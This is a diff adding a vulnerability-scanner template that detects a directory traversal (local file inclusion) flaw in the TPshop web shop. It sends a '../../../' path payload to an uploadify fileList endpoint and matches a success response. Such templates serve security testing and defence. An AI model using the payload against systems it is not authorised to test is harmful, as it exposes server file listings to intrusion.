@@ -1,0 +1,28 @@
+id: "tpshop-directory-traversal"
+name: "TPshop - Local File Inclusion"
+severity: "high"
+description: "TPshop is vulnerable to local file inclusion."
+tech:
+  - "php"
+tags:
+  - "tpshop"
+  - "lfi"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php/Home/uploadify/fileList?type=.+&path=../../../"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "\"state\":\"SUCCESS\""
+  - type: "status"
+    status:
+      - 200
